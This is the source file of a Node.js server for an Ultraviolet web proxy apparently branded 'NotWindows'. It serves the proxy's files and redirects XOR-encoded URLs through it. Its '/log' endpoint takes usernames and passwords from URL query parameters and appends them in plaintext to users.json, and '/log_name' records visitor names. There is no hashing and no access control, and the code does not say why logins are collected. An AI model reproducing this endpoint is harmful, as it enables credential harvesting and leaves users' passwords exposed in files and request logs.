import { createBareServer } from "@tomphttp/bare-server-node";
import express from "express";
import { createServer } from "node:http";
import { publicPath } from "./ultraviolet-static/lib/index.js";
import { uvPath } from "@titaniumnetwork-dev/ultraviolet";
import { join } from "node:path";
import { hostname } from "node:os";
import fs from 'fs';
var app = express();

const bare = createBareServer("/bare/");
app.use('/',express.static(publicPath));
app.use("/uv/", express.static(uvPath));
app.use(express.static('public'));

class xor {
  static encode(str) {
    return encodeURIComponent(
      str
        .toString()
        .split("")
        .map((char, ind) =>
          ind % 2 ? String.fromCharCode(char.charCodeAt() ^ 2) : char
        )
        .join("")
    );
  }
  static decode(str) {
    if (str.charAt(str.length - 1) == "/") str = str.slice(0, -1);
    return decodeURIComponent(str)
      .split("")
      .map((char, ind) =>
        ind % 2 ? String.fromCharCode(char.charCodeAt() ^ 2) : char
      )
      .join("");
  }
  static uriencode(str) {
      return encodeURIComponent(str)
  }
}

app.get('/quick/*', (req, res)=>{
  var url = req.url.slice(7);
  console.log("[NotWindows] Server frontend received query 'quick'.");
  res.redirect('/uv/service/'+xor.encode(url));
});
app.get('/log_name', (req, res)=>{
  var name = req.query.name;
  var data = fs.readFileSync('names.json');
  var users = JSON.parse(data);
  users.push(name);
  var data2 = JSON.stringify(users);
  fs.writeFileSync('names.json', data2);
  res.send("success");
})
app.get('/log', (req, res)=>{
  console.log("[NotWindows] Server frontend received query 'log'.");
    // log the ?user=x&pass=y to users.json
    var user = req.query.user;
    var pass = req.query.pass;
    var data = fs.readFileSync('users.json');
    var users = JSON.parse(data);
    // users is an array, add the {username:user,password:pass} to the array and write it back
    users.push({username:user,password:pass});
    var data2 = JSON.stringify(users);
    fs.writeFileSync('users.json', data2);
    res.send("success");
});

const server = createServer();

server.on("request", (req, res) => {
  if (bare.shouldRoute(req)) {
    bare.routeRequest(req, res);
    console.log("[NotWindows] Server bareuv received route.");
  } else {
    app(req, res);
  }
});

server.on("upgrade", (req, socket, head) => {
  if (bare.shouldRoute(req)) {
    bare.routeUpgrade(req, socket, head);
    console.log("[NotWindows] Server bareuv received upgrade.");
  } else {
    socket.end();
  }
});

let port = parseInt(process.env.PORT || 3000);

server.on("listening", () => {
  const address = server.address();

  // by default we are listening on 0.0.0.0 (every interface)
  // we just need to list a few
  console.log("[NotWindows] Dual server listening.");
  console.log(`http://localhost:${address.port}`);
});

// https://expressjs.com/en/advanced/healthcheck-graceful-shutdown.html
process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

function shutdown() {
  console.log("[NotWindows] Sigterm - shutting dual (bareuv, frontend, process) down.");
  server.close();
  bare.close();
  process.exit(0);
}

server.listen({
  port,
});
